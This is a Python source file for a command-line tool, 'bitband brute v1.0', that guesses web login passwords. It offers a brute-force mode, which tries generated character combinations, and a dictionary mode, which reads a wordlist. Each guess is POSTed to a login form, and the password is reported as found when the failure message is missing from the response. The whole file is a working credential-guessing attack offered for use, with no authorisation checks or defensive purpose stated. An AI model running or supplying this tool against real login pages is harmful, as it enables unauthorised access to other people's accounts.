import requests
from utils.functions import *
from colorama import init, Fore


def main():
    init()
    userInput = input(
        "::. welcome to bitband brute v1.0 .::\n1- brute force attack\n2- dictionary attack\n3- quit\n\nchoose your option: "
    )

    if userInput == "1":
        username = input("username: ")
        passwordChars = input("password includes: ")
        minPassLength = int(input("min password length: "))
        maxPassLength = int(input("max password length: "))
        url = input("url: ")
        wrongPassMessage = input("wrong pass message: ")
        usernameFormName = input("what is username name in html form: ")
        passwordFormName = input("what is password name in html form: ")

        for testingPassword in generatePassword(passwordChars, minPassLength, maxPassLength):            
            print(f"testing password {testingPassword}")
            testingResult = test(url, wrongPassMessage, usernameFormName=usernameFormName, passwordFormName=passwordFormName, username=username, testingPassword=testingPassword)
            if testingResult:
                print(f"{Fore.RED}PASSWORD IS {testingPassword}")
                return
    elif userInput == "2":
        username = input("username: ")
        url = input("url: ")
        wrongPassMessage = input("wrong pass message: ")
        usernameFormName = input("what is username name in html form: ")
        passwordFormName = input("what is password name in html form: ")
        passListAddress = input(
            "password list address(fileName shouldnt contain space): ")

        f = open(passListAddress, 'r')

        for strTestingPass in f:
            print(f"testing password: {strTestingPass}")
            data = {
                usernameFormName: username,
                passwordFormName: strTestingPass.replace("\n", "")
            }
            response = requests.post(url, data=data)

            if not wrongPassMessage in response.text:
                print(f"{Fore.RED}PASSWORD IS {strTestingPass}")
                return 0
    elif "3":
        print("Good Bye ;)")
        return 0
    else:
        print("wrong option")


if __name__ == "__main__":
    main()
